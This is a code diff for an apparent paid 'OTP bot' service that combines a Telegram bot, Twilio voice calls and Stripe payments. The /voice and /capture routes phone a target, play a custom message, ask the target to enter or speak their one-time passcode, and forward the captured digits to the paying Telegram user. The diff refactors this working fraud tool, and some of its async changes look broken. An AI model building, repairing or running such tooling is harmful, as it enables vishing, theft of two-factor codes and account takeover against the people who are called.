@@ -15,10 +15,10 @@ from twilio.twiml.voice_response import VoiceResponse, Gather
 import stripe
 
 # -------------------------
-# Load env variables
+# Load environment variables
 # -------------------------
 PORT = int(os.environ.get("PORT", 5000))
-RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
+RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")  # e.g., https://otp-28gz.onrender.com
 STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY")
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
 TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID")
@@ -132,6 +132,7 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             keyboard = InlineKeyboardMarkup([
                 [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
+                [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
             ])
             await query.edit_message_text(
                 "📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.",
@@ -199,10 +200,10 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # -------------------------
 # Build Telegram Application
 # -------------------------
-app_telegram = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-app_telegram.add_handler(CommandHandler("start", start))
-app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
-app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CallbackQueryHandler(handle_buttons))
+application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
 # -------------------------
 # Flask app for webhook
@@ -211,8 +212,9 @@ flask_app = Flask(__name__)
 
 @flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
 def telegram_webhook():
-    update = Update.de_json(request.get_json(force=True), app_telegram.bot)
-    asyncio.run(app_telegram.process_update(update))  # Safe, avoids _loop
+    data = request.get_json(force=True)
+    update = Update.de_json(data, application.bot)
+    asyncio.create_task(application.process_update(update))
     return "OK", 200
 
 @flask_app.route("/voice", methods=["POST", "GET"])
@@ -223,28 +225,24 @@ def voice():
     gather.say(message)
     gather.say("Now, please enter or speak your OTP.")
     resp.append(gather)
-    resp.say("No input received. Goodbye!")
+    resp.say("We did not receive your OTP. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
 
 @flask_app.route("/capture", methods=["POST"])
 def capture():
-    otp = request.values.get("Digits") or request.values.get("SpeechResult")
-    phone = request.values.get("To") or request.values.get("From")
-    captured_otp[phone] = otp
-    chat_id = phone_to_chat.get(phone)
+    digits = request.values.get("Digits")
+    from_number = request.values.get("From")
+    chat_id = phone_to_chat.get(from_number)
     if chat_id:
-        app_telegram.bot.send_message(chat_id=chat_id, text=f"✅ Captured OTP: {otp}")
-    return Response("OK", mimetype="text/plain")
+        captured_otp[from_number] = digits
+        asyncio.create_task(application.bot.send_message(chat_id, text=f"✅ Captured OTP: {digits}"))
+    return Response("<Response></Response>", mimetype="text/xml")
 
-@flask_app.route("/success", methods=["GET"])
-def stripe_success():
-    user_id = int(request.args.get("user_id"))
-    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
-    return "Payment success! You now have 4-day access."
-
-@flask_app.route("/cancel", methods=["GET"])
-def stripe_cancel():
-    return "Payment canceled."
+@flask_app.route("/call_status", methods=["POST"])
+def call_status():
+    return Response("<Response></Response>", mimetype="text/xml")
 
 if __name__ == "__main__":
+    asyncio.run(application.initialize())
+    asyncio.run(application.start())
     flask_app.run(host="0.0.0.0", port=PORT)
